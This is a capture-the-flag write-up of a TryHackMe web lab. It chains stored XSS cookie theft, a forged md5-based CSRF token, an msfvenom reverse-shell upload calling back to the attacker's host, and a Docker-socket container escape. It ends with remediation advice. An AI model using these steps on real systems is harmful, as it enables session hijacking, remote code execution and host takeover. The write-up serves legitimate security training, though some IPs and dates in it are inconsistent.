# Writeup #1

# Vulnerability Report

## Context

**CTF**: [https://tryhackme.com/room/sequence](https://tryhackme.com/room/sequence)

The vulnerable program is a website accessible by a url on TryHackMe’s hosted VM. Simply start both the target machine and attacker machine to access the website. The website maintains XSS vulnerabilities via a contact form to its moderators. Once logged in as a mod, the website maintains a chat functionality with the admin, in addition to other peripheral users. Leveraging CSRF vulnerabilities allows access to the admin’s privileges. After gaining access to an internal web application, I was able to gain a shell in a docker container, and subsequently escape it. 

Reconnaissance and Enumeration:

1. Nmap: 
    
    ```bash
    $ nmap -p- -A 10.82.159.58
    Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-29 21:19 GMT
    mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
    mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
    Nmap scan report for 10.82.159.58
    Host is up (0.00079s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Review Shop
    
    ```
    
    1. The HttpOnly flag is not set, thus allowing JavaScript to read and modify cookies on [http://10-82-115-32](http://10-82-115-32) via document.cookie. Depending on other aspects of the website’s security, it is likely vulnerable to XSS attacks.
2. Gobuster:
    
    ```bash
    $ gobuster dir -u http://10.82.159.58 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.82.159.58
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /uploads              (Status: 301) [Size: 314] [--> http://10.82.159.58/uploads/]
    /mail                 (Status: 301) [Size: 311] [--> http://10.82.159.58/mail/]
    /javascript           (Status: 301) [Size: 317] [--> http://10.82.159.58/javascript/]
    /phpmyadmin           (ttatus: 301) [Size: 317] [--> http://10.82.159.58/phpmyadmin/]
    /server-status        (Status: 403) [Size: 277]
    Progress: 220560 / 220561 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    
    ```
    
    1. Only visiting [http://10.82.159.58/mail](http://10.82.159.58/mail) yielded intriguing results. Inside the directory is a file called dump.txt, which contains the following key information:
        
        ```
        From: software@review.thm
        To: product@review.thm
        Subject: Update on Code and Feature Deployment
        
        Hi Team,
        
        I have successfully updated the code. The Lottery and Finance panels have also been created.
        
        Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.
        
        For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.
        
        I will be away on holiday but will be back soon.
        
        Regards,  
        Robert
        
        ```
        
        1. This file provides both a valid password and a potential user named Robert for the specified directories. Accessing both /finance.php and /lottery.php yields a “404 Not Found” error,  however. This motivates the exploitation of authorized profiles that may be able to successfully visit these directories. 

## Vulnerabilities

1. Stored XSS in Contact Form: 
    1. The /contact.php page accepts user input and stores it. That input is later rendered in a moderator-facing panel. 
    2. The vulnerability exists because user input is rendered directly into HTML without output encoding. The source code did not directly indicate this vulnerability, but successful attempts to exfiltrate visiting users’ cookies to a python web server suggest backend input sanitization failures. Further, because HttpOnly is not set, JavaScript can access document.cookie. 
2. Broken CSRF Protection: 
    1. The promote_coadmin.php endpoint uses a permanent CSRF token structured as: 
        
        ```
        md5(username)
        ```
        
    2. Example observed request that will promote the corresponding username and csrf token associated with that username to admin. 
        
        ```
        GET /promote_coadmin.php?username=mod&csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5
        ```
        
    3. This is not true CSRF protection, as it is deterministic, not random, not stored server-side, not session-bound, and doesn’t expire. As a result, anyone who can cause an admin to visit a crafted URL specifying their username and token can escalate privileges.
3. Insecure File Upload: 
    1. The /finance.php panel allows file uploads without file extension validation, MIME type validation, disabling script execution, or storing uploads outside of the web root. This allows arbitrary server-side code execution, possibly leading to RCE. 
4. Docker Socket Exposure:
    1. Inside the compromised container, /var/run/docker.sock was mounted and writable. Docker, as an app, exposes a control API through /var/run/docker.sock, which the Docker daemon listens to in order to create and manage containers. Because the Docker daemon runs as root on the host, any container with access to this socket can issue privileged commands. In practice, this means that the attacker can access and modify files on the host directly, completely bypassing container boundaries and escalating from container root to full host root access.

## Exploitation

1. XSS Attack:
    1. As mentioned earlier, [http://10.82.159.5](http://10.82.159.5/) does not set the HttpOnly flag; I thus attempt an XSS attack on [http://10.82.159.5/contact.php](http://10.82.159.5/contact.php)
        1. I first create an http server on the attack box as such:
            
            ```bash
            $ python3 -m http.server
            ```
            
        2. I enter the following JavaScript code into a Contact Us textbox and click send. After a few minutes, a simulated viewer visiting [http://10.82.159.5/contact.php](http://10.82.159.5/contact.php) will trigger an outbound HTTP request to the attacker’s box.
            
            ![Contact Us Textbox](Writeup-1/Contact-Us.png)
            
        3. I receive a response:
            
            ```bash
            $ python -m http.server 80
            Serving HTTP on 0.0.0.0 port 80 (<http://0.0.0.0:80/>) ...
            10.82.84.83 - - [1/Feb/2026 21:28:09] "GET /test.js HTTP/1.1" 200 -
            ```
            
        4. I then attempt to steal the visiting user’s PHPSESSID session cookie:
            
            ![XSS Attack](Writeup-1/XSS-Attack.png)
            
        5. I receive a response:
            
            ```bash
            python -m http.server 80
            Serving HTTP on 0.0.0.0 port 80 (<http://0.0.0.0:80/>) ...
            10.82.84.83 - - [1/Feb/2026 21:31:23] "GET /?c=PHPSESSID%3Dv0b1fgg7is1vdis471mf17t6pd HTTP/1.1" 200 -
            ```
            
2. CSRF Attack:
    1. I add what I just obtained as a value to my PHPSESSID cookie and refresh to find the **first flag**
        
        ![Session Hijacking](Writeup-1/Session-Hijacking.png)
        
    2. I then notice that I am logged in as **mod**; I visit the chat.php page and notice that I have an active chat with the site’s **admin**. I send a random link to test if the admin successfully clicks on any link sent in the chat as such:
        
        ![Chat with Admin](Writeup-1/Chat-With-Admin.webp)
        
    3. Soon, I get a response back to my web server:
        
        ```bash
        python -m http.server 8000
        Serving HTTP on 0.0.0.0 port 8000 (<http://0.0.0.0:8000/>) ...
        10.82.84.83 - - [20/Sep/2025 21:48:10] "GET / HTTP/1.1" 200 -
        ```
        
    4. I poke around the website and notice a page called promote_coadmin.php; however, I am unable to see any content on this page unless I am an admin. Looking at the burpsuite request, I notice the following CSRF token:
        
        ```html
        GET /promote_coadmin.php?username=mod&csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5
        ```
        
    5. I use cyberchef to detect the hash type (md5) and attempt to crack the hash as follows:
        
        ```bash
        $ hashcat hash.txt -m 0 /usr/share/wordlists/rockyou.txt
        ad148a3ca8bd0ef3b48c52454c493ec5:mod
        ```
        
    6. I then craft a fake csrf token:
        
        ```bash
        echo -n "admin" | md5sum                          
        21232f297a57a5a743894a0e4a801fc3
        ```
        
    7. I then craft the following link and send it to the admin over the chat interface: [http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3](http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3); I set the username to my username, mod, and set the CSRF token to our created token. As per the name “promote_coadmin”, I am hoping that if the admin clicks on this link, I will be promoted to admin. I logout and login and find that I am successfully an admin; I then find the **second flag**. 
        
        ![Privilege Escalation](Writeup-1/Privilege-Escalation.png)
        
3. Gaining root access:
    1. Based on /mail.php, I know there are two websites, /finance.php and /lottery.php. After visiting /finance.php, I notice the following login functionality:
        
        ![finance.php webpage](Writeup-1/Finance-Webpage.webp)
        
    2.  Fortunately, the letter from /mail.php provides the password to login. After logging in, I notice upload functionality and attempt to exploit that to gain RCE. 
        1. I use metasploit to create the following reverse shell listener :
            
            ```bash
            $ msfconsole
            use exploit/multi/handler
            set PAYLOAD python/meterpreter/reverse_tcp
            set LHOST 10.82.84.83
            set LPORT 4444
            exploit
            ```
            
        2. I create and upload the following reverse shell exploit to /finance.php:
            
            ```bash
            $ msfvenom -p python/meterpreter/reverse_tcp LHOST=10.82.84.83 LPORT=4444 -f raw > shell.py
            ```
            
        3. Getting the connection back, I notice that I am stuck in a docker environment:
            
            ```bash
            root@4f18a45cca05:/# id
            uid=0(root) gid=0(root) groups=0(root)
            ```
            
        4. I attempt to enumerate using [deepce.sh](http://deepce.sh/):
            
            ```bash
            root@4f18a45cca05:~# ./deepce.sh 
            [+] Exploit Test ............ Exploitable - Check this out
            [+] Sock is writable ........ Yes
            [+] Docker sock mounted ....... Yes
            ```
            
        5. Noticing that the docker sock is mounted, I find the following website that helps me exploit this vulnerability, https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html#mounted-docker-socket-escape, and complete the following steps. I then find the **third and final flag**. 
            
            ```bash
            #List images to use one
            docker images
            ...
            phpvulnerable
            ...
            
            #Run the vulnerable image mounting the host disk and chroot on it
            docker run -it -v /:/host/ phpvulnerable chroot /host/ bash
            
            # Get full access to the host via ns pid and nsenter cli
            docker run -it --rm --pid=host --privileged phpvulnerable bash
            nsenter --target 1 --mount --uts --ipc --net --pid -- bash
            
            # Now I've escaped
            root@sequence:/# cd root/
            root@sequence:~# ls -la
            total 68
            drwxr-x--- 12 root root 4096 Jun  4 11:58  .
            drwxr-xr-x 19 root root 4096 Sep 21 19:43  ..
            lrwxrwxrwx  1 root root    9 Feb  4  2024  .bash_history -> /dev/null
            -rw-r--r--  1 root root 3106 Dec  5  2019  .bashrc
            drwxr-xr-x  3 root root 4096 Feb  2  2024  .cache
            drwx------  3 root root 4096 Feb  2  2024  .config
            drwxr-xr-x  3 root root 4096 Nov 10  2021  .local
            -rw-------  1 root root  131 Jun  4 10:18  .mysql_history
            -rw-r--r--  1 root root  161 Dec  5  2019  .profile
            -rw-r--r--  1 root root   66 Feb  1  2024  .selected_editor
            drwx------  2 root root 4096 Nov 10  2021  .ssh
            drwxr-xr-x  2 root root 4096 Feb  2  2024  bin
            -rw-r--r--  1 root root   20 Jun  4 11:58  flag.txt
            ```
            

## Remediation

1. Session Hijacking:
    1. **Issue:** `PHPSESSID` lacked `HttpOnly`, enabling cookie theft via XSS.
    2. **Fix:**
        1. Enable `HttpOnly`, `Secure`, and `SameSite=Strict` on session cookies.
        2. Enforce HTTPS site-wide.
2. Stored XSS (Contact Form):
    1. **Issue:** User input rendered without output encoding.
    2. **Fix:**
        1. Use proper output encoding (`htmlspecialchars()` in PHP).
        2. Implement a strict Content Security Policy (CSP).
        3. Validate and sanitize user input.
3.  Broken CSRF Protection (Predictable Token):
    1. **Issue:** CSRF token was `md5(username)` — deterministic and guessable.
    2. **Fix:**
        1. Generate cryptographically secure, random, per-session tokens.
        2. Use POST for state-changing actions.
4.  Insecure File Upload → RCE:
    1. **Issue:** Arbitrary file upload allowed execution of malicious payload.
    2. **Fix:**
        1. Whitelist allowed file types and validate MIME types.
        2. Store uploads outside web root.
        3. Disable execution permissions in upload directories.
5. Docker Socket Exposure → Container Escape:
    1. **Issue:** Docker socket mounted inside container allowed host takeover.
    2. **Fix:**
        1. Never mount `/var/run/docker.sock` into containers.
        2. Avoid running containers as root.
        3. Use minimal privileges and seccomp/AppArmor profiles.
